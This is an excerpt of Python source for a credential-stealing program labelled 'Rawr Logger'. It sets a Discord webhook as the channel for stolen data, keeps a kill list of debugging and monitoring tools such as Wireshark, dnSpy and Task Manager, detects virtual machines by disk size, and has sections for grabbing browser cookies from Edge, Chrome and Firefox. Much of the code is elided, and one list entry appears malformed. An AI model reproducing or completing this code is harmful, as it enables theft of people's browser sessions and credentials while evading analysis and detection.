...
webhook = "https://discord.com/api/webhooks/1537102500505845880/qfAwAjTBS_P0ZFyJTgxzsA8cVeTx_z27n2V8zUAD3EKmnpzpe97PmMpYzoV-mc7k8lp6"

# --- VM / DEBUGGER KILL LIST ---
process = [
    "ProcessHacker.exe", "httpdebuggerui.exe", "wireshark.exe",
    "HttpAnalyzerV7.exe", "fiddler.exe", "taskmgr.psutilexe,",
    "regedit.exe", "cmd.exe", "taskmgr.exe", "vboxservice.exe",
    "ollydbg.exe", "dnSpy.exe", "procexp64.exe", "procexp.exe"
]
...
if diskSizeGB < minDiskSizeGB:
    try:
        embedss = {
            ...
            "embeds": [{
                "author": {"name": "Rawr Logger", "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"},
...
# --- COOKIE GRABBING FUNCTIONS (EDGE, CHROME, FIREFOX) ---
def edge():
    try:
...
# --- THREADED BROWSER COOKIE EXTRACTION ---
